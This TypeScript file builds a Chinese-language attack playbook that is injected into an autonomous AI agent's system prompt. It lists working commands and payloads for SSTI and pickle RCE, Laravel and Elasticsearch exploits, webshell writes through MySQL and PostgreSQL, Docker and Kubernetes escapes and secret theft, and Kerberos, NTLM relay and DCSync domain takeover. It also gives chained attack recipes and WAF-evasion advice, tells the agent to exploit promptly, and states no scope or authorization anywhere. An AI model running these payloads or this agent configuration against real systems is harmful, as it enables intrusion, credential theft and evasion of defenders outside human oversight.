/**
 * 攻击知识库 (Attack Knowledge Base)
 *
 * 注入到系统 Prompt 中，扩展 Agent 的攻击面视野和工具组合能力。
 * 不是简单的 CVE 列表，而是系统性的攻击方法论 + 工具组合指南。
 *
 * 设计理念：
 * - 告诉 Agent "遇到 X 可以尝试 A/B/C/D"，而不是只会跑 nuclei
 * - 提供工具组合公式：工具A + 工具B + 工具C = 完整攻击链
 * - 覆盖现代攻击向量：云原生、API、容器、供应链
 */

// ─── 注入格式 ──────────────────────────────────────────────────────────────

export function getAttackKnowledgeSection(): string {
  return `# 红队攻击知识库 (Attack Knowledge Base)

这是你的系统性攻击方法论参考。遇到新目标时，不要只会跑 nuclei 然后等结果。根据发现的技术栈、服务、架构，从下面的知识库中选择最合适的攻击路径。

---

## 一、现代 Web 攻击向量

### 1.1 API 攻击
**REST API 常见漏洞模式：**
- **IDOR (Insecure Direct Object Reference)** — 修改 URL 中的 ID 参数：/api/users/1 → /api/users/2
  - 工具：curl / Burp Intruder / ffuf -w id_list.txt -u "URL/FUZZ"
  - 检查：认证接口、支付接口、订单接口、文件下载接口
- **批量赋值 (Mass Assignment)** — POST 时注入 admin=true / role=admin / is_admin=1
- **批量 API 枚举** — ffuf -w api_endpoints.txt -u "URL/api/FUZZ" -H "Authorization: Bearer TOKEN"
- **API 版本绕过** — /api/v1/admin → /api/v2/admin (v2 可能没做鉴权)

**GraphQL 攻击：**
- **内省查询** — POST /graphql {"query": "{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}
- **批量操作** — GraphQL 允许在一个请求中执行多个操作：{"query": "{u1:users{id} u2:users{id,admin} u3:users{id,password}"}
- **深度嵌套 DoS** — 嵌套关系查询 {users{posts{comments{author{posts{...}}}}}}
- **工具：**
  - inql (Burp 插件) — 自动内省 + 枚举
  - graphql-cli — introspect -e http://TARGET/graphql
  - curl + jq 手工构造

**JWT 攻击：**
- **算法替换** — RS256 → HS256：用公钥作为 HMAC 密钥签名
  - python3 -c "import jwt; print(jwt.encode({'admin':True},'PUBLIC_KEY',algorithm='HS256'))"
- **None 算法** — {"alg":"none","typ":"JWT"} → 直接构造无签名 token
- **jwk 注入** — 注入自定义 JWK header
- **工具：** jwt_tool (pip install jwt_tool) — 全自动 JWT 测试
  - python3 jwt_tool.py TOKEN -C -d "url" -M at (攻击测试)

### 1.2 认证绕过
**登录绕过模式：**
- SQL 注入：admin'-- / admin' OR '1'='1 / ' UNION SELECT 1,'admin','password',3--
- 密码重置：Host/Referer/X-Forwarded-Host 头注入修改重置链接域名
- 2FA 绕过：直接访问 /dashboard 跳过验证、修改响应码、删除 Cookie
- OAuth 劫持：redirect_uri 参数修改劫持 code
- 工具：
  - oauth2-testing (github 搜索)
  - Burp OAuth Toolkit

**默认凭证列表（优先级从高到低）：**
- admin:admin / admin:password / admin:123456
- root:toor / root:root / root:admin
- 框架默认：Spring Boot actuator / Tomcat manager:tomcat:tomcat / JBoss admin:admin
- 数据库：postgres:postgres / root:(空) / sa:(空) / oracle:oracle
- 中间件：admin:admin123 (Nexus) / admin:password (Jenkins)

### 1.3 文件上传绕过
**绕过检测的策略：**
- 扩展名绕过：.php → .php3 .php4 .php5 .phtml .phps .htaccess
- MIME 绕过：Content-Type: image/jpeg + PHP magic bytes (GIF89a + <?php...)
- 双扩展名：shell.php.jpg / shell.php%00.jpg (截断) / shell.php;.jpg
- 大小写绕过：shell.PhP / shell.Php
- 压缩上传：上传 .zip/.tar.gz，服务器端解压后保持 .php
- 二次渲染绕过：上传带 webshell 的图片，找不处理的部分
- Apache .htaccess 注入：上传 .htaccess → AddType application/x-httpd-php .jpg
- 工具：
  - upload-bypass-fuzzing (ffuf 自定义 wordlist)
  - exiftool 注入 metadata：exiftool -Comment="<?php system(\\$_GET['cmd']);?>" image.jpg

### 1.4 SSRF 链式攻击
**基础 SSRF → 进阶利用：**
1. 内网探测：ssrf → http://127.0.0.1:6379 → Redis 未授权 → 写 crontab/webshell
2. 云元数据：ssrf → http://169.254.169.254/latest/meta-data/iam/security-credentials/ → AWS 凭证
3. Gopher 协议：ssrf → gopher://127.0.0.1:6379/_*1\\r\\n\\$4\\r\\ninfo\\r\\n → Redis 命令执行
4. Dict 协议：ssrf → dict://127.0.0.1:11211/stats → Memcached 注入
5. FastCGI：ssrf → fastcgi://127.0.0.1:9000 → PHP-FPM RCE
6. MySQL 未授权：ssrf → mysql://127.0.0.1:3306/ → LOAD_FILE 读取
7. 工具：
  - Gopherus (github) — 生成 SSRF payload 用于各种协议
  - Burp Collaborator — 验证盲 SSRF
  - curl -x socks5://127.0.0.1:1080 http://INTERNAL_IP/

### 1.5 模板注入 (SSTI / SSTI)
**检测：**
- {{7*7}} → 49 → Jinja2/Twig/Freemarker
- \${7*7} → 49 → Spring EL / Freemarker
- \#{7*7} → 49 → Thymeleaf
- <%7*7%> → 49 → ASP/ERB

**利用：**
- Jinja2 (Python/Flask)：
  - {{''.__class__.__mro__[1].__subclasses__()}} → 列出所有类
  - {{config}} → Flask 配置泄露
  - Payload：{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil.txt','w').write('evil')}}
- Freemarker (Java)：
  - <#assign ex="freemarker.template.utility.Execute"?new()> \${ex("id")}
- Thymeleaf (Spring)：
  - \${T(java.lang.Runtime).getRuntime().exec("id")}

### 1.6 反序列化攻击大全
**Java 反序列化：**
- 检测工具：ysoserial (java -jar ysoserial.jar CommonsCollections1 'cmd')
- 框架检测：
  - Shiro (RememberMe=base64) → ysoserial CommonsBeanutils1 → ShiroAttack2
  - WebLogic (T3 协议) → ysoserial CommonsCollections → weblogic 专用 exp
  - JBoss (JMXInvokerServlet) → JBossSer
  - Fastjson (JSON 反序列化) → @type 注入 (见 manual-exploit prompt 中的模板)
- 工具：ysoserial、marshalsec (Java + Python)、SerializationDumper

**Python 反序列化 (Pickle)：**
- 检测：base64 字符串、\\x80\\x03 开头
- 利用：
  import pickle, base64, os
  class Exploit(object):
      def __reduce__(self):
          return (os.system, ('id',))
  print(base64.b64encode(pickle.dumps(Exploit())).decode())

**PHP 反序列化：**
- 检测：O:4:"User":2:{s:3:"age";i:20;s:4:"name";s:4:"John";}
- POP 链构造：找 __wakeup / __destruct → 找可利用的 gadget chain
- 工具：PHPGGC (phpggc Laravel/RCE1 'id')

---

## 二、现代框架与中间件漏洞

### 2.1 Java 生态
**Spring 全家桶：**
- Spring4Shell (CVE-2022-22965) — JDK9+ Tomcat + data binding → 见 manual-exploit
- Spring Boot Actuator 信息泄露：
  - /actuator/env → 环境变量/密码
  - /actuator/heapdump → 内存 dump (含密码)
  - /actuator/loggers → 修改日志级别为 DEBUG
  - /env POST 刷新配置 → 结合 Eureka/Consul RCE
- Spring Cloud Function SpEL 注入 (CVE-2022-22963)：
  curl -s "TARGET/functionRouter" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('id')"

**Apache 全家桶：**
- Log4Shell (CVE-2021-44228) — 见 manual-exploit
- Apache Solr RCE — 见 manual-exploit
- Apache Struts2 — 见 manual-exploit
- Apache Druid (CVE-2021-25646) — 见 manual-exploit
- Apache Dubbo 反序列化 — Hessian2 反序列化 → ysoserial
- Tomcat AJP 文件包含 (CVE-2020-1938 Ghostcat)：
  python ghostcat.py -f /WEB-INF/web.xml TARGET 8009

**中间件：**
- Nginx 配置绕过：/static%20/../../etc/passwd (%20 绕过 location 匹配)
- Nginx 解析漏洞：/upload/shell.jpg → /upload/shell.jpg/.php → 以 PHP 执行
- Apache 解析漏洞：shell.php.xxx → 以 PHP 解析
- IIS 解析漏洞：shell.asp;.jpg → 以 ASP 执行

### 2.2 PHP 生态
**ThinkPHP — 见 manual-exploit prompt**

**Laravel：**
- Laravel <= 8.x RCE (CVE-2021-3129)：
  curl -s "TARGET/_ignition/execute-solution" -X POST \
    -H "Content-Type: application/json" \
    -d '{"solution":"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/read=convert.base64-encode/resource=/etc/passwd"}}'
- Laravel Ignition RCE → 写 phar 触发反序列化
- Laravel 8.x CVE-2022-31208 → SQL 注入

**WordPress：**
- 插件漏洞扫描：wpscan --url TARGET --enumerate vp,vt,tt,cb,dbe
- 后台 RCE：主题编辑 → 404.php 插入 webshell → 访问 /wp-content/themes/THEME/404.php?cmd=id
- xmlrpc.php 暴力破解：curl -s "TARGET/xmlrpc.php" -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>"

### 2.3 Python 生态
**Flask：**
- SSTI → 见模板注入部分
- Debug Pin 计算：如果 /console 可访问 → 计算 Werkzeug debug PIN → 代码执行
  - 需要：username + modname + getattr(app, '__file__', None) + site-packages 路径 + MAC 地址
- pickle.loads 反序列化 → 见反序列化部分

**Django：**
- SQL 注入 (某些 ORM 用法)：User.objects.raw("SELECT * FROM auth_user WHERE username='" + input + "'")
- 目录遍历 (MEDIA_ROOT 配置不当)

### 2.4 Node.js 生态
**原型链污染：**
- 检测：POST {"__proto__":{"isAdmin":true}} → 检查响应
- 利用：
  POST {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id');//"}}
  → Node.js template RCE
- 常见库：lodash < 4.17.21、mixin-deep、merge、express-fileupload

**Node.js 反序列化：**
- node-serialize / funcster → RCE
- serialized-javascript → function 序列化注入

**npm 供应链攻击：**
- 检查 package.json 中的 postinstall / preinstall 脚本
- 检查 node_modules 中的可疑 .js 文件

### 2.5 Go 生态
**Go Web 框架常见漏洞：**
- Gin/Echo/Beego 路径遍历 (未正确校验用户输入的路径参数)
- gRPC 未授权访问 (端口暴露在公网)：
  grpcurl TARGET:9090 list → grpcurl TARGET:9090 describe proto.Service → grpcurl -d '{"id":"1"}' TARGET:9090 proto.Service/Method

---

## 三、云原生 & 容器攻击

### 3.1 Docker 攻击
**Docker Socket 利用 (最常用)：**
- 检测：ls -la /var/run/docker.sock
- 利用：
  curl --unix-socket /var/run/docker.sock http://localhost/containers/json → 列出容器
  curl --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=evil" \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"]}'
- 直接 Docker 命令：docker run -v /:/host -it alpine chroot /host /bin/sh
- 工具：chise (github.com/canardtoasters/chise) — Docker 逃逸检查

**容器逃逸：**
- privileged 模式：fdisk -l → mount /dev/sda1 /tmp/host → 逃逸
- cgroup 逃逸：
  mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
  mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release
  echo "/tmp/exploit.sh" > /tmp/cgrp/release_agent
  echo '#!/bin/sh' > /tmp/exploit.sh && chmod +x /tmp/exploit.sh
- overlay2 写宿主机：在 overlay2 目录写文件 → 同步到宿主机

### 3.2 Kubernetes 攻击
**API 服务器未授权：**
- curl -k https://TARGET:6443/api/v1/pods → 列出所有 pod
- curl -k https://TARGET:6443/api/v1/namespaces/kube-system/secrets → 获取 secrets
- 创建容器：
  curl -k https://TARGET:6443/api/v1/namespaces/default/pods \
    -X POST -H "Content-Type: application/json" \
    -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil"},"spec":{"containers":[{"name":"evil","image":"alpine","command":["/bin/sh","-c","while true; do sleep 3600; done"]}]}}'
- ServiceAccount token 滥用：
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  curl -k https://kubernetes/api/v1/namespaces/default/pods -H "Authorization: Bearer \$TOKEN"
- 工具：kubesploit / kubectl / cdks-k8s

### 3.3 CI/CD 管道攻击
**Jenkins RCE — 见 manual-exploit prompt**

**GitLab：**
- 11.4.7 RCE (CVE-2018-19585)：邮件导入功能 SSRF → RCE
- CI/CD 变量泄露：访问 /api/v4/projects → 获取 .env 中的密码
- Runner 逃逸：在 CI job 中访问宿主机

**GitHub Actions：**
- 仓库中 secrets 注入到环境
- 恶意 PR 触发 workflow → 获取仓库 secrets

---

## 四、数据库攻击

### 4.1 Redis
**未授权访问 → RCE (见 manual-exploit prompt)**

### 4.2 MongoDB
**未授权访问 (默认 27017)：**
- mongo TARGET:27017 → show dbs → use admin → db.system.users.find()
- mongosh TARGET:27017 --eval "db.adminCommand({listDatabases:1})"
- 写 webshell (如果有 web 目录)：
  mongosh TARGET:27017 --eval 'use admin; db.admin.find().forEach(printjson)'
- 数据导出：mongodump -h TARGET:27017 -o /tmp/dump

### 4.3 MySQL
**root 空密码 / 弱密码：**
- mysql -h TARGET -u root → SELECT * FROM mysql.user; → 读取密码
- INTO OUTFILE 写文件：
  SELECT '<?php system(\\$_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
  → 条件：file_priv=Y 且知道 web 路径
- UDF 提权 (Linux)：
  CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
  SELECT sys_eval('id');
- 工具：mysql-udf (github) — 编译 UDF

### 4.4 PostgreSQL
**命令执行 (高版本受限)：**
- COPY (SELECT '<?php system(\\$_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
- 高版本 (>= 9.3)：
  CREATE TABLE cmd(output text);
  COPY cmd FROM PROGRAM 'id';
  SELECT * FROM cmd;

### 4.5 Elasticsearch
**未授权访问 (9200 端口)：**
- curl -s "TARGET:9200/_cat/indices" → 列出索引
- curl -s "TARGET:9200/_cat/nodes?pretty" → 集群信息
- RCE (旧版本 CVE-2014-3120 / CVE-2015-1427)：
  curl -s "TARGET:9200/_search" -X POST \
    -H "Content-Type: application/json" \
    -d '{"size":1,"script_fields":{"test":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'

---

## 五、内网 & AD 域攻击大全

### 5.1 认证协议攻击
**Kerberos 攻击链：**
1. **AS-REP Roasting** (无预认证账户)：
   impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt
   hashcat -m 18200 asrep.txt rockyou.txt
2. **Kerberoasting** (请求 TGS 离线破解)：
   impacket-GetUserSPNs domain/user:pass -dc-ip DC_IP -request -outputfile tgs.txt
   hashcat -m 13100 tgs.txt rockyou.txt
3. **Silver Ticket** (已知 Service Account hash)：
   impacket-ticketer -spn HOST/DC.domain.com -domain-sid SID -domain domain -nthash HASH -user-id 500 administrator
4. **Golden Ticket** (已知 krbtgt hash)：
   impacket-ticketer -domain domain -domain-sid SID -nthash KRBTGT_HASH administrator
   → 获取域内任何用户的 TGT

**NTLM 攻击：**
1. **LLMNR/NBT-NS Poisoning**：
   responder -I eth0 -wrf → 捕获 Net-NTLMv2 hash
2. **NTLM Relay**：
   impacket-ntlmrelayx -t smb://DC_IP -smb2support
   结合 responder 捕获 → relay → 创建域管理员
3. **Pass-the-Hash**：
   impacket-psexec domain/admin@HOST -hashes :NTLM_HASH
   impacket-wmiexec domain/admin@HOST -hashes :NTLM_HASH "cmd"
   impacket-smbexec domain/admin@HOST -hashes :NTLM_HASH

### 5.2 AD 信息收集
**BloodHound 数据采集：**
- SharpHound.exe -c All -d domain.com --ZipFileName data.zip → 导入 BloodHound
- 从 Linux：
  proxychains bloodhound-python -d domain.com -u user -p pass -c All -ns DC_IP --zip
- 分析结果：找到最短路径到 Domain Admin

**PowerView 命令：**
- 域用户枚举：proxychains impacket-samrdump domain/admin:pass@DC_IP
- 委派检查：impacket-findDelegation domain/user:pass -dc-ip DC_IP
- ACL 滥用：
  GenericAll → 修改目标用户密码
  GenericWrite → 修改目标用户 SPN → Kerberoasting
  WriteDACL → 给自己加 GenericAll 权限

### 5.3 横向移动扩展
**SMB 传递：**
- crackmapexec smb INTERNAL_CIDR -u user -p pass --shares → 查看共享目录
- crackmapexec smb INTERNAL_CIDR -u user -p pass --sam → dump SAM 数据库
- crackmapexec smb INTERNAL_CIDR -u user -p pass --ntds → dump NTDS.dit

**WMI 远程执行：**
- impacket-wmiexec domain/user:pass@HOST "cmd /c whoami"
- impacket-atexec domain/user:pass@HOST "cmd /c whoami"

**SCM 服务控制管理器滥用：**
- impacket-services domain/user:pass@HOST create EvilService -path "C:\\\\Windows\\\\Temp\\\\evil.exe"
- impacket-services domain/user:pass@HOST start EvilService

**DCSync (域控密码同步)：**
- impacket-secretsdump -just-dc -just-dc-user krbtgt domain/admin:pass@DC_IP
- mimikatz lsadump::dcsync /domain:domain.com /user:krbtgt

---

## 六、信息泄露 & 隐蔽入口

### 6.1 敏感文件枚举
**Web 根目录常见文件：**
- .env / .env.production / .env.local → 数据库密码、API keys
- .git/config / .git/HEAD → Git 信息泄露 → git-dumper
- .svn/entries → SVN 信息泄露
- config.php / application.yml / database.yml / wp-config.php
- .htaccess / web.config / nginx.conf → 服务器配置
- backup.sql / dump.sql / db.sql / database.bak
- robots.txt / sitemap.xml → 隐藏路径
- /server-status (Apache) / /nginx_status → 运行状态
- /.well-known/security.txt → 安全联系人

**Git 泄露利用：**
- git-dumper http://TARGET/.git /tmp/target-git → 下载完整仓库
- trufflehog / gitleaks → 扫描仓库中的密码和密钥
- git log --oneline → 查看历史提交
- git show COMMIT_HASH → 查看具体变更

### 6.2 备份文件探测
**常见备份文件名：**
- backup.tar.gz / backup.zip / db.tar.gz / www.zip / web.zip
- site_old.tar.gz / backup_$(date +%Y%m%d).tar.gz
- database.sql.gz / db_backup.sql
- .tar / .bak / .swp / .orig / .copy
- 工具：ffuf -w backup_wordlist.txt -u "TARGET/FUZZ" -mc 200 -fs 0

### 6.3 API Key & Token 泄露
**检测工具：**
- trufflehog https://github.com/TARGET-ORG → 扫描 GitHub
- gitleaks --repo https://github.com/TARGET-ORG → 同上
- curl "https://crt.sh/?q=%.TARGET.com" → 证书透明度找子域名
- WebSearch "TARGET api key" / "TARGET secret" / "TARGET password"

**常见 Token 利用：**
- AWS Access Key → aws sts get-caller-identity → S3 访问 → EC2 执行
- Slack Token → 读取聊天记录、创建 bot
- GitHub Token → 访问私有仓库、触发 CI/CD
- Google API Key → 使用配额、访问 GCS

---

## 七、攻击链组合公式 (Attack Chain Recipes)

### 链 1：信息泄露 → 凭证 → Shell
1. ffuf 发现 /.env → curl 读取 → 获取数据库密码
2. 连接数据库 → SELECT * FROM users → 找到密码
3. SSH 登录 → cat /flag

### 链 2：子域名 → 测试环境 → RCE
1. subfinder 发现 test.TARGET.com
2. httpx 发现 test 环境无 WAF + Debug 模式
3. /actuator/env 泄露配置 → /actuator/heapdump 获取内存凭证
4. 利用 Spring Boot 特性 RCE

### 链 3：SSRF → 内网 Redis → Shell
1. SSRF 漏洞 → curl 内网 http://10.0.0.5:6379
2. 发现 Redis 未授权 → Gopher payload 写 crontab
3. 反弹 shell → 提权 → flag

### 链 4：API 注入 → 数据库 → 横向移动
1. IDOR 修改 /api/users/self → 发现管理员 ID
2. 修改管理员密码 → 登录后台
3. 后台文件上传 → webshell → 内网扫描

### 链 5：容器逃逸 → 宿主机 → 云凭证
1. 进入容器 (webshell) → ls /var/run/docker.sock
2. Docker API 创建特权容器 → mount /:/host
3. 读取 /host/etc/shadow → 宿主机 root
4. 读取 /home/*/.*kube/config → K8s 凭证

---

## 八、工具组合速查表

### 侦察组合
| 目标 | 工具组合 | 命令示例 |
|------|---------|---------|
| 子域名 | subfinder + amass + httpx | subfinder -d TARGET \| amass enum -passive -d TARGET \| httpx -silent |
| 端口 | masscan + nmap | masscan -p- TARGET --rate=10000 → nmap -sV -p 开放端口 TARGET |
| Web 资产 | httpx + katana + gau | httpx -l subs.txt \| katana -u - -d 3 \| gau TARGET |
| 技术指纹 | httpx -td + nuclei -t tech-detect | httpx -u TARGET -td -server -title |
| WAF 检测 | wafw00f + httpx -waf | wafw00f TARGET |

### 漏洞扫描组合
| 目标 | 工具组合 | 命令示例 |
|------|---------|---------|
| Web 漏洞 | nuclei 全模板 | nuclei -u TARGET -t ~/nuclei-templates/ -c 100 -rl 500 |
| CVE 专项 | nuclei + tags | nuclei -u TARGET -tags cve,rce,sqli -c 100 |
| 目录枚举 | ffuf + dirsearch | ffuf -u TARGET/FUZZ -w wordlist -ac |
| 服务漏洞 | nmap vuln script | nmap -sV --script vuln -p 端口 TARGET |
| 默认凭证 | nuclei default-login | nuclei -u TARGET -tags default-login |

### 利用组合
| 漏洞类型 | 工具组合 | 说明 |
|---------|---------|------|
| RCE | curl → bash 反弹 → ShellSession | 手工构造 payload |
| SQL 注入 | sqlmap --os-shell → 命令执行 | 先 --dbs 再 --os-shell |
| 文件上传 | curl -F 上传 → webshell | 注意绕过检测 |
| 反序列化 | ysoserial → 编码 → curl 注入 | 根据框架选 gadget |
| SSRF | curl/Gopherus → 内网服务 | 注意协议支持 |
| 弱口令 | hydra / crackmapexec | 用 top-usernames + common passwords |

---

## 九、红旗信号 (Quick Wins)

遇到以下情况，**立即深入利用**：

- **开放端口 6379/11211/27017/9200** → 未授权访问数据库
- **/actuator 路径** → Spring Boot 信息泄露 → heapdump → 密码
- **/.env 文件** → 数据库/API 密码
- **/.git/** → 代码泄露 → git-dumper → 密码
- **X-Forwarded-Host** → SSRF / Host 头注入
- **JWT token 在 URL/Cookie 中** → jwt_tool 测试
- **Apache 2.4.49/2.4.50** → CVE-2021-41773 RCE
- **ThinkPHP 框架** → RCE (见模板)
- **Shiro RememberMe** → 反序列化 (见模板)
- **Jenkins /console** → Script Console RCE
- **Docker Socket 可访问** → 容器逃逸
- **K8s API 未授权** → 全集群控制
- **phpMyAdmin 暴露** → 弱密码 → RCE via SELECT INTO OUTFILE
- **phpinfo() 暴露** → $_SERVER 泄露 → 路径、版本、配置

---

## 十、错误处理和超时应对

当遇到 ETIMEDOUT / Connection refused / 连接超时时：

1. **目标端口不可达** → 该服务可能不在此端口或目标有防护，不要无限重试
2. **DNS 解析失败** → 目标可能不存或域名已失效，跳过该目标
3. **扫描被拦截 (WAF/IPS)** → 尝试：
   - 降低扫描速率 (-T2 代替 -T4)
   - 分段扫描 (一次扫 1000 端口而不是全部)
   - 使用不同的源 IP
   - 换用其他工具 (naabu 代替 nmap)
4. **子 agent 超时** → 检查目标连通性 (ping / curl)，不通则标记该目标为不可达
5. **部分成功** → 即使部分扫描超时，继续处理已获得的结果，不阻塞整体进度`
}
